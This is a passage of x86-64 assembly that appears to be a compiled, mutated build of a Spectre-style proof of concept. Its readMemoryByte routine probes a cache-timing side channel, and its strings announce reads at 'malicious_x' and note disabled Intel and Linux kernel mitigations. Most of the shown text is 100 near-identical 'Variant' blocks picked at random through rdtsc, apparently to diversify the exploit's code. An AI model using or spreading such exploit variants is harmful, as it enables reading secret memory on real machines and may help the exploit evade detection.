	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 18
.LreadMemoryByte_win0_var18:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 19
.LreadMemoryByte_win0_var19:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 20
.LreadMemoryByte_win0_var20:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 21
.LreadMemoryByte_win0_var21:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 22
.LreadMemoryByte_win0_var22:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 23
.LreadMemoryByte_win0_var23:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 24
.LreadMemoryByte_win0_var24:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 25
.LreadMemoryByte_win0_var25:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 26
.LreadMemoryByte_win0_var26:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 27
.LreadMemoryByte_win0_var27:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 28
.LreadMemoryByte_win0_var28:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 29
.LreadMemoryByte_win0_var29:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 30
.LreadMemoryByte_win0_var30:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 31
.LreadMemoryByte_win0_var31:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 32
.LreadMemoryByte_win0_var32:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 33
.LreadMemoryByte_win0_var33:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 34
.LreadMemoryByte_win0_var34:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 35
.LreadMemoryByte_win0_var35:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 36
.LreadMemoryByte_win0_var36:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 37
.LreadMemoryByte_win0_var37:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 38
.LreadMemoryByte_win0_var38:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 39
.LreadMemoryByte_win0_var39:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 40
.LreadMemoryByte_win0_var40:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 41
.LreadMemoryByte_win0_var41:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 42
.LreadMemoryByte_win0_var42:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 43
.LreadMemoryByte_win0_var43:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 44
.LreadMemoryByte_win0_var44:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 45
.LreadMemoryByte_win0_var45:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 46
.LreadMemoryByte_win0_var46:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 47
.LreadMemoryByte_win0_var47:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 48
.LreadMemoryByte_win0_var48:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 49
.LreadMemoryByte_win0_var49:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 50
.LreadMemoryByte_win0_var50:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 51
.LreadMemoryByte_win0_var51:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 52
.LreadMemoryByte_win0_var52:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 53
.LreadMemoryByte_win0_var53:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 54
.LreadMemoryByte_win0_var54:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 55
.LreadMemoryByte_win0_var55:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 56
.LreadMemoryByte_win0_var56:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 57
.LreadMemoryByte_win0_var57:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 58
.LreadMemoryByte_win0_var58:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 59
.LreadMemoryByte_win0_var59:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 60
.LreadMemoryByte_win0_var60:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 61
.LreadMemoryByte_win0_var61:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 62
.LreadMemoryByte_win0_var62:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 63
.LreadMemoryByte_win0_var63:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 64
.LreadMemoryByte_win0_var64:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 65
.LreadMemoryByte_win0_var65:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 66
.LreadMemoryByte_win0_var66:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 67
.LreadMemoryByte_win0_var67:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 68
.LreadMemoryByte_win0_var68:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 69
.LreadMemoryByte_win0_var69:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 70
.LreadMemoryByte_win0_var70:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 71
.LreadMemoryByte_win0_var71:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 72
.LreadMemoryByte_win0_var72:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 73
.LreadMemoryByte_win0_var73:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 74
.LreadMemoryByte_win0_var74:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 75
.LreadMemoryByte_win0_var75:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 76
.LreadMemoryByte_win0_var76:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 77
.LreadMemoryByte_win0_var77:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 78
.LreadMemoryByte_win0_var78:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 79
.LreadMemoryByte_win0_var79:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 80
.LreadMemoryByte_win0_var80:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 81
.LreadMemoryByte_win0_var81:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 82
.LreadMemoryByte_win0_var82:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 83
.LreadMemoryByte_win0_var83:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 84
.LreadMemoryByte_win0_var84:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 85
.LreadMemoryByte_win0_var85:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 86
.LreadMemoryByte_win0_var86:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 87
.LreadMemoryByte_win0_var87:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 88
.LreadMemoryByte_win0_var88:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 89
.LreadMemoryByte_win0_var89:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 90
.LreadMemoryByte_win0_var90:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 91
.LreadMemoryByte_win0_var91:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 92
.LreadMemoryByte_win0_var92:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 93
.LreadMemoryByte_win0_var93:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 94
.LreadMemoryByte_win0_var94:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 95
.LreadMemoryByte_win0_var95:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 96
.LreadMemoryByte_win0_var96:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 97
.LreadMemoryByte_win0_var97:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 98
.LreadMemoryByte_win0_var98:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 99
.LreadMemoryByte_win0_var99:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
.LreadMemoryByte_win0_continue:
	addq	$32, %rsp
	testl	%eax, %eax
	je	.L25
.L26:
	subl	$1, -100(%rbp)
.L7:
	cmpl	$0, -100(%rbp)
	jg	.L27
.L25:
	movl	-92(%rbp), %eax
	movl	%eax, %edx
	movq	-136(%rbp), %rax
	movb	%dl, (%rax)
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movq	-144(%rbp), %rax
	movl	%edx, (%rax)
	movq	-136(%rbp), %rax
	addq	$1, %rax
	movl	-88(%rbp), %edx
	movb	%dl, (%rax)
	movq	-144(%rbp), %rax
	leaq	4(%rax), %rdx
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	movl	%eax, (%rdx)
	movl	results.0(%rip), %eax
	movl	%eax, %edx
	movl	-108(%rbp), %eax
	xorl	%edx, %eax
	movl	%eax, results.0(%rip)
	nop
	movq	-24(%rbp), %rax
	subq	%fs:40, %rax
	je	.L28
	call	__stack_chk_fail@PLT
.L28:
	subq	$-128, %rsp
	popq	%rbx
	popq	%r12
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4380:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
.LC1:
	.string	"%d"
.LC2:
	.string	"%p"
	.align 8
.LC3:
	.string	"Using a cache hit threshold of %d.\n"
.LC4:
	.string	"Build: "
.LC5:
	.string	"RDTSCP_SUPPORTED "
.LC6:
	.string	"MFENCE_SUPPORTED "
.LC7:
	.string	"CLFLUSH_SUPPORTED "
.LC8:
	.string	"INTEL_MITIGATION_DISABLED "
	.align 8
.LC9:
	.string	"LINUX_KERNEL_MITIGATION_DISABLED "
.LC10:
	.string	"Reading %d bytes:\n"
	.align 8
.LC11:
	.string	"Reading at malicious_x = %p... "
.LC12:
	.string	"Success"
.LC13:
	.string	"Unclear"
.LC14:
	.string	"%s: "
.LC15:
	.string	"0x%02X=\342\200\231%c\342\200\231 score=%d "
	.align 8
.LC16:
	.string	"(second best: 0x%02X=\342\200\231%c\342\200\231 score=%d)"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4381:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movl	%edi, -52(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	$80, -44(%rbp)
	movq	secret(%rip), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -32(%rbp)
	movl	$40, -40(%rbp)
	movl	$0, -36(%rbp)
	jmp	.L30
.L31:
	movl	-36(%rbp), %eax
	cltq
	leaq	array2(%rip), %rdx
	movb	$1, (%rax,%rdx)
	addl	$1, -36(%rbp)
.L30:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win6_var0
	cmpl	$1, %eax
	je	.Lmain_win6_var1
	cmpl	$2, %eax
	je	.Lmain_win6_var2
	cmpl	$3, %eax
	je	.Lmain_win6_var3
	cmpl	$4, %eax
	je	.Lmain_win6_var4
	cmpl	$5, %eax
	je	.Lmain_win6_var5
	cmpl	$6, %eax
	je	.Lmain_win6_var6
	cmpl	$7, %eax
	je	.Lmain_win6_var7
	cmpl	$8, %eax
	je	.Lmain_win6_var8
	cmpl	$9, %eax
	je	.Lmain_win6_var9
	cmpl	$10, %eax
	je	.Lmain_win6_var10
	cmpl	$11, %eax
	je	.Lmain_win6_var11
	cmpl	$12, %eax
	je	.Lmain_win6_var12
	cmpl	$13, %eax
	je	.Lmain_win6_var13
	cmpl	$14, %eax
	je	.Lmain_win6_var14
	cmpl	$15, %eax
	je	.Lmain_win6_var15
	cmpl	$16, %eax
	je	.Lmain_win6_var16
